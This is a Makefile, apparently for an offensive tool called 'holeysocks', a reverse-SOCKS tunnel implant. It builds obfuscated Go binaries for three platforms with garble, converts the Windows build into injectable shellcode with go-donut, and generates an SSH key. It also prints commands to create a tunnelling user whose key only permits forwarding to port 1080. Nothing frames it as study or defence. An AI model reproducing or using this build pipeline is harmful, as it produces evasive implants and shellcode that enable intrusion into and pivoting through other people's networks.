APP=holeysocks
OUT=bin

GARBLE=${GOPATH}/bin/garble
GODONUT=${GOPATH}/bin/go-donut

BUILD=garble -tiny build

PLATFORMS=linux windows darwin
target=$(word 1, $@)

all: ${PLATFORMS} shellcode

${PLATFORMS}: $(GARBLE) configs/id_ed25519
	GOOS=${target} ${BUILD} -buildmode=pie -o ${OUT}/${APP}-${target}

shellcode: $(GODONUT) windows
	${GODONUT} --arch x64 --verbose --out ${OUT}/${APP}-win-sc.bin --in ${OUT}/${APP}-windows

release: all
	@tar -czvf ${APP}.tar.gz ${OUT}

clean: 
	rm -rf ${OUT} configs/id_ed25519 ${APP}.tar.gz

$(GARBLE):
	go get mvdan.cc/garble

$(GODONUT):
	go get -u github.com/Binject/go-donut

configs/id_ed25519:
	ssh-keygen -t ed25519 -f ${target} -N '' -C ${APP} >/dev/null
	@echo
	@echo "================================================="
	@echo "                 IMPORTANT"
	@echo "================================================="
	@echo
	@echo "# The following creates a user with a /bin/false shell on the target ssh server."
	@echo "# And appends the following line to that user's authorized_keys file"
	@echo
	@echo "HDIR=/home/sshuser"
	@echo "useradd -s /bin/false -m -d \$${HDIR} -N sshuser"
	@echo "mkdir -p \$${HDIR}/.ssh"
	@echo "cat <<EOF >> \$${HDIR}/.ssh/authorized_keys"
	@echo "NO-X11-FORWARDING,PERMITOPEN=\"0.0.0.0:1080\" `cat ${target}.pub`"
	@echo "EOF"
	@echo
	@echo "# If you know your target's public IP, you can also prepend the above with:"
	@echo "FROM=<ip or hostname>"
	@echo

.PHONY: ${PLATFORMS} all clean shellcode
